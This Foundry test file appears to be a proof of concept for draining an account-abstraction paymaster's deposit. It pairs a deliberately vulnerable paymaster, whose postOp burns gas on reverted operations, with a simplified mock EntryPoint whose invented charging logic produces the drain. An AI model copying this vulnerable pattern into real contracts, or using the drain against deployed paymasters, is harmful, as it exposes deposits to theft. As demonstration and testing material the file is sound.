// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "account-abstraction/interfaces/IEntryPoint.sol";
import "account-abstraction/interfaces/IPaymaster.sol";
import "account-abstraction/interfaces/PackedUserOperation.sol";


contract VulnerablePaymaster is IPaymaster {
    IEntryPoint private _entryPoint;

    constructor(IEntryPoint entryPoint) {
        _entryPoint = entryPoint;
    }

    function validatePaymasterUserOp(
        PackedUserOperation calldata userOp,
        bytes32 userOpHash,
        uint256 maxCost
    ) external override returns (bytes memory context, uint256 validationData) {
        return ("", 0);
    }

    function postOp(PostOpMode mode, bytes calldata context, uint256 actualGasCost, uint256 actualUserOpFeePerGas) external override {
        if (mode == PostOpMode.opReverted) { // Changed to opReverted as postOpReverted is not used for calls
            for (uint i = 0; i < 100000; i++) {
                // Infinite loop to cause OOG
            }
        }
    }

    function deposit() public payable {
        _entryPoint.depositTo{value: msg.value}(address(this));
    }

    function getDeposit() public view returns (uint256) {
        return _entryPoint.getDepositInfo(address(this)).deposit;
    }
}

contract MockEntryPoint is IEntryPoint {
    mapping(address => DepositInfo) public deposits;

    function depositTo(address paymaster) public payable override {
        deposits[paymaster].deposit += msg.value;
    }

    function getDepositInfo(address paymaster) public view override returns (DepositInfo memory info) {
        return deposits[paymaster];
    }

    function handleOps(PackedUserOperation[] calldata ops, address payable beneficiary) public override {
        PackedUserOperation calldata op = ops[0];
        (address paymaster, ,) = unpackPaymasterStaticFields(op.paymasterAndData);
        uint256 postOpStipend = 200000;

        try IPaymaster(paymaster).postOp{gas: postOpStipend}(IPaymaster.PostOpMode.opReverted, "", 0, 0) {
            // success
        } catch {
            (, uint256 maxFeePerGas) = unpackGasFees(op.gasFees);
            deposits[paymaster].deposit -= postOpStipend * maxFeePerGas;
        }
    }
    
    function unpackPaymasterStaticFields(
        bytes calldata paymasterAndData
    ) internal pure returns (address paymaster, uint256 validationGasLimit, uint256 postOpGasLimit) {
        return (
            address(bytes20(paymasterAndData[:20])),
            0,
            0
        );
    }

    function unpackGasFees(bytes32 gasFees) internal pure returns (uint256 maxPriorityFeePerGas, uint256 maxFeePerGas) {
        return (uint256(gasFees >> 128), uint256(uint128(bytes16(gasFees))));
    }

    // Other IEntryPoint functions
    function addStake(uint32 unstakeDelaySec) external payable override {}
    function unlockStake() external override {}
    function withdrawStake(address payable withdrawAddress) external override {}
    function withdrawTo(address payable withdrawAddress, uint256 withdrawAmount) external override {}
    function getSenderAddress(bytes calldata initCode) external override { revert(); }
    function getNonce(address sender, uint192 key) external view override returns (uint256 nonce) { return 0; }
    function getUserOpHash(PackedUserOperation calldata userOp) external view override returns (bytes32) { return bytes32(0); }
    function handleAggregatedOps(UserOpsPerAggregator[] calldata opsPerAggregator, address payable beneficiary) external override {}
    function delegateAndRevert(address target, bytes calldata data) external override {}
    function senderCreator() external view override returns (ISenderCreator) { return ISenderCreator(address(0)); }
    function balanceOf(address account) external view override returns (uint256) { return 0; }
    function incrementNonce(uint192 key) external override {}
}

contract MinimalPoCTest is Test {
    MockEntryPoint internal entryPoint;
    VulnerablePaymaster internal paymaster;

    function setUp() public {
        entryPoint = new MockEntryPoint();
        paymaster = new VulnerablePaymaster(IEntryPoint(address(entryPoint)));
    }

    function testPostOpOOGDrain() public {
        uint256 initialDeposit = 1 ether;
        uint256 maxFeePerGas = 1 gwei;
        uint256 maxPriorityFeePerGas = 1 gwei;
        uint256 postOpStipend = 200000;

        paymaster.deposit{value: initialDeposit}();

        PackedUserOperation[] memory ops = new PackedUserOperation[](1);
        ops[0] = PackedUserOperation({
            sender: address(this),
            nonce: 0,
            initCode: "",
            callData: "",
            accountGasLimits: bytes32(0),
            preVerificationGas: 21000,
            gasFees: bytes32(uint256(maxPriorityFeePerGas) << 128 | maxFeePerGas),
            paymasterAndData: abi.encodePacked(address(paymaster)),
            signature: ""
        });

        entryPoint.handleOps(ops, payable(address(this)));

        uint256 expectedDrain = postOpStipend * maxFeePerGas;
        assertApproxEqAbs(paymaster.getDeposit(), initialDeposit - expectedDrain, 1000);
    }
}
